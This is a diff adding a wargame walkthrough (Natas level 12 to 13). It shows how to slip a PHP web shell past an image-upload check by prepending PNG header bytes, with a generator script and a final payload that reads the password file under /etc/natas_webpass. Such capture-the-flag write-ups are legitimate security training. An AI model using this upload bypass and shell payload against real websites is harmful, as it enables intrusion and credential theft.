@@ -638,7 +638,7 @@ This time the user is welcomed with the instructions of uploading a `.jpeg` of u
 - Find what needs to be done.
 - Get the password.
 
-### Testing the uploader
+### Testing the uploader 11
 
 - Not uploading anything shows an error.
 - Uploading any file changes its name and forces its extension to `.jpg`.
@@ -745,3 +745,147 @@ Thoughts:
 
 - `$out`: gets the result of running the shell command.
 - `echo ...`: makes it visible on the web page.
+
+## Level 12 ➡ Level 13
+
+The website looks almost like the previous one, the only difference is that this time is has a message saying it only accepts image files.
+
+- Test the uploader.
+- Inspect the resources.
+- Get the password.
+
+### Testing the uploader 12
+
+- Uploading a php file doesn't seem to work.
+- Changing the file extension on the html doesn't work either.
+
+### Inspection 12
+
+#### HTML inspection 12
+
+The html doesn't seem to contain relevant information. Changing the file extension there does not affect how the backend gets the file.
+
+#### PHP inspection 12
+
+There seems to be the same functions as previous room.
+
+- `getRandomString()`: has the same implementation.
+- `makeRandomPath($dir, $ext)`: has the same implementation.
+- `makeRandomPathFromFilename($dir, $fn)`: has the same implementation.
+
+What changes is the implementation of the `if` statement that comes before the `move_uploaded_file()`:
+
+```php
+if($err){
+    if($err === 2){
+        echo "The uploaded file exceeds MAX_FILE_SIZE";
+    } else{
+        echo "Something went wrong :/";
+    }
+} else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
+    echo "File is too big";
+} else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
+    echo "File is not an image";
+} else {
+    // ...
+}
+```
+
+This particular it in charge of blocking the user uploads if the file is not an image:
+
+```php
+else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
+    echo "File is not an image";
+}
+```
+
+After doing some research about that function, what ended up catching my attention was this:
+
+> `exif_imagetype()` reads the first bytes of an image and checks its signature.
+
+A possible strategy could be changing the first bytes of the `.php` file and tricking the function into considering an image.
+
+### Resolution 12
+
+#### More info about `exif_imagetype` and how to bypass it
+
+Doing more research about the `exif_imagetype()` function gave me the following info:
+
+- In order to determine if a file is an image, **it reads the first 8 bytes**.
+- The logic behind the functions does not care about the file extension.
+- The algorithm checks for a valid image data in addition to the headers.
+
+Some examples of the first bytes:
+
+| TYPE  |           BYTES           |      ASCII       |
+| :---: | :-----------------------: | :--------------: |
+| JPEG  |        `FF D8 FF`         |      `ÿØÿ`       |
+|  PNG  | `89 50 4E 47 0D 0A 1A 0A` | `‰PNG\r\n\x1A\n` |
+|  GIF  |       `47 49 46 38`       |      `GIF8`      |
+
+#### Masking the PHP file
+
+Steps to follow:
+
+1. Add image headers.
+2. Add valid image data.
+3. Append the php code.
+4. Test it.
+
+Final product:
+
+```php
+<?php
+$valid_png_header = "\x89PNG\r\n\x1A\n"
+    . "\x00\x00\x00\rIHDR"
+    . "\x00\x00\x00\x01\x00\x00\x00\x01"
+    . "\x08\x02\x00\x00\x00\x9C\x7F\x8D\xF3"
+    . "\x00\x00\x00\x0CIDATx\xDA"
+    . "\x63\x60\x60\x60\x00\x00\x00\x01"
+    . "\x00\x01\x01\x00\x00\x00\x00\x00"
+    . "\x00\x00\x00\x00\x00\x00\x00\x00"
+    . "\x00\x00\x00\x00\x00\x00\x00\x00"
+    . "\x00\x00\x00\x00\x00\x00\x00\x00"
+    . "\x00\x00\x00\x00\x00\x00\x00\x00";
+
+$php_code = "<?php\n"
+    . "echo \"This is a PHP file.\";\n"
+    . "?>";
+
+$combined_content = $valid_png_header . $php_code;
+file_put_contents('fakeimg.php', $combined_content);
+
+// Verify the file type
+$file_type = exif_imagetype('fakeimg.php');
+if ($file_type === false) {
+    echo "The file is not recognized as an image.\n";
+} else {
+    echo "The file is recognized as an image of type: $file_type\n";
+}
+?>
+```
+
+#### Testing the fake image on the website
+
+It works:
+
+> The file `upload/4emxs1rgq2.php` has been uploaded.
+
+And the execution shows:
+
+```html
+�PNG  IHDR���IDATx�c```This is a PHP file.
+```
+
+#### Adding the real code
+
+Lastly, change the php code to look for natas14's password.
+
+```php
+// ...
+$php_code = "<?php\n"
+    . "\$out = shell_exec(\"cat /etc/natas_webpass/natas14\");\n"
+    . "echo \"<pre>\$out</pre>\";\n"
+    . "?>";
+// ...
+```
